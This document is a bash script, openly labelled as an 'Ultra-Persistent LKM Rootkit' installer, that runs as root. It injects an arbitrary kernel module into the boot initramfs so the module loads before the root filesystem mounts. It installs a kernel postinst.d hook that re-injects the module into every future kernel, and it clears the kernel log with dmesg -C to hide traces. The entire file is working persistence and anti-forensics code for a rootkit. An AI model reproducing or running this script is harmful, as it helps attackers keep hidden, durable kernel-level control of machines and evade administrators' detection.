#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Initramfs Injection — Ultra-Persistent LKM Rootkit [*] "
echo ""
echo "This injects a kernel module into the initramfs (initrd) so it"
echo "loads BEFORE the root filesystem mounts — the earliest possible"
echo "persistence. Survives even if /lib/modules/ is cleaned."
echo ""

KVER=$(uname -r)
INITRD="/boot/initrd.img-${KVER}"

if [ ! -f "$INITRD" ]; then
    # Check alternative paths
    INITRD="/boot/initramfs-${KVER}.img"
    if [ ! -f "$INITRD" ]; then
        echo "[ERROR] Cannot find initrd/initramfs for kernel $KVER" >&2
        echo "  Checked: /boot/initrd.img-${KVER}, /boot/initramfs-${KVER}.img" >&2
        exit 1
    fi
fi

echo "[*] Found initramfs: $INITRD"

# Check for required tools
for tool in unmkinitramfs cpio gzip find; do
    if ! command -v "$tool" &>/dev/null; then
        if [ "$tool" == "unmkinitramfs" ]; then
            echo "[WARNING] unmkinitramfs not found, will use alternative extraction."
        else
            echo "[ERROR] Required tool '$tool' not found." >&2
            exit 1
        fi
    fi
done

read -p "Enter the full path to the .ko module to inject: " ko_path

if [ ! -f "$ko_path" ]; then
    echo "[ERROR] Module file not found at $ko_path" >&2
    exit 1
fi

modname=$(basename "$ko_path" .ko)

# Backup original initramfs
BACKUP="${INITRD}.bak.$(date +%s)"
echo "[+] Backing up original initramfs to $BACKUP"
cp "$INITRD" "$BACKUP"

# Create working directory
WORKDIR=$(mktemp -d /tmp/initramfs_inject.XXXXXX)
cd "$WORKDIR"

echo "[+] Extracting initramfs..."
if command -v unmkinitramfs &>/dev/null; then
    unmkinitramfs "$INITRD" "$WORKDIR/extracted" 2>/dev/null
    # unmkinitramfs may create main/ and early/ subdirs
    if [ -d "$WORKDIR/extracted/main" ]; then
        ROOTFS="$WORKDIR/extracted/main"
    elif [ -d "$WORKDIR/extracted" ]; then
        ROOTFS="$WORKDIR/extracted"
    fi
else
    mkdir -p "$WORKDIR/extracted"
    cd "$WORKDIR/extracted"
    zcat "$INITRD" 2>/dev/null | cpio -idm 2>/dev/null
    if [ $? -ne 0 ]; then
        # Try xz or lz4 compression
        xzcat "$INITRD" 2>/dev/null | cpio -idm 2>/dev/null || \
        lz4cat "$INITRD" 2>/dev/null | cpio -idm 2>/dev/null || {
            echo "[ERROR] Failed to extract initramfs. Unknown compression format." >&2
            rm -rf "$WORKDIR"
            exit 1
        }
    fi
    ROOTFS="$WORKDIR/extracted"
fi

if [ ! -d "$ROOTFS" ]; then
    echo "[ERROR] Extraction failed — root filesystem not found." >&2
    rm -rf "$WORKDIR"
    exit 1
fi

echo "[+] Injecting module into initramfs..."
MODULE_DIR="$ROOTFS/lib/modules/$KVER/kernel/lib"
mkdir -p "$MODULE_DIR"
cp "$ko_path" "$MODULE_DIR/${modname}.ko"

# Add insmod command to init script
INIT_SCRIPT=""
for candidate in "$ROOTFS/init" "$ROOTFS/scripts/init-top/ORDER" "$ROOTFS/scripts/init-premount/ORDER"; do
    if [ -f "$candidate" ]; then
        INIT_SCRIPT="$candidate"
        break
    fi
done

if [ -z "$INIT_SCRIPT" ]; then
    INIT_SCRIPT="$ROOTFS/init"
fi

# Inject insmod into init script (early — right after the shebang)
if [ -f "$INIT_SCRIPT" ]; then
    INSMOD_LINE="insmod /lib/modules/$KVER/kernel/lib/${modname}.ko"
    if ! grep -qF "$INSMOD_LINE" "$INIT_SCRIPT" 2>/dev/null; then
        # Insert after the first line (shebang)
        sed -i "2i\\$INSMOD_LINE" "$INIT_SCRIPT"
        echo "[+] Injected insmod command into $INIT_SCRIPT"
    fi
else
    echo "[WARNING] No init script found. Creating minimal loader."
    cat > "$ROOTFS/scripts/init-premount/load_module" <<LOADER
#!/bin/sh
insmod /lib/modules/$KVER/kernel/lib/${modname}.ko
LOADER
    chmod +x "$ROOTFS/scripts/init-premount/load_module"
fi

echo "[+] Rebuilding initramfs..."
cd "$ROOTFS"
find . | cpio -o -H newc 2>/dev/null | gzip > "$INITRD"

if [ $? -eq 0 ]; then
    echo "[+] Initramfs rebuilt successfully."
else
    echo "[ERROR] Failed to rebuild initramfs. Restoring backup..." >&2
    cp "$BACKUP" "$INITRD"
    rm -rf "$WORKDIR"
    exit 1
fi

# Clean up
rm -rf "$WORKDIR"

# Install a kernel postinst hook so new kernels also get injected
echo "[+] Installing kernel postinst.d hook for future kernels..."
mkdir -p /etc/kernel/postinst.d/
cat > /etc/kernel/postinst.d/zz-initramfs-${modname} <<'HOOKEOF'
#!/bin/bash
# Re-inject module into new kernel's initramfs
NEWKVER="$1"
NEWINITRD="$2"
KO_SRC="PLACEHOLDER_KO"
MODNAME="PLACEHOLDER_MODNAME"

if [ -z "$NEWINITRD" ]; then
    NEWINITRD="/boot/initrd.img-${NEWKVER}"
fi

if [ -f "$KO_SRC" ] && [ -f "$NEWINITRD" ]; then
    TMPDIR=$(mktemp -d /tmp/initinject.XXXXXX)
    cd "$TMPDIR"
    mkdir extracted && cd extracted
    zcat "$NEWINITRD" 2>/dev/null | cpio -idm 2>/dev/null
    mkdir -p "lib/modules/${NEWKVER}/kernel/lib/"
    cp "$KO_SRC" "lib/modules/${NEWKVER}/kernel/lib/${MODNAME}.ko"
    if [ -f init ]; then
        INSMOD_LINE="insmod /lib/modules/${NEWKVER}/kernel/lib/${MODNAME}.ko"
        grep -qF "$INSMOD_LINE" init || sed -i "2i\\$INSMOD_LINE" init
    fi
    find . | cpio -o -H newc 2>/dev/null | gzip > "$NEWINITRD"
    rm -rf "$TMPDIR"
fi
HOOKEOF

# Replace placeholders with actual values
sed -i "s|PLACEHOLDER_KO|$ko_path|g" /etc/kernel/postinst.d/zz-initramfs-${modname}
sed -i "s|PLACEHOLDER_MODNAME|$modname|g" /etc/kernel/postinst.d/zz-initramfs-${modname}
chmod +x /etc/kernel/postinst.d/zz-initramfs-${modname}

# Clean traces
dmesg -C 2>/dev/null

clear

echo "[*] Success!! Initramfs injection complete for module: $modname [*]"
echo "    Initramfs:  $INITRD"
echo "    Backup:     $BACKUP"
echo "    Module loads BEFORE root filesystem mounts."
echo "    Kernel update hook installed for future kernels."

sleep 2

clear
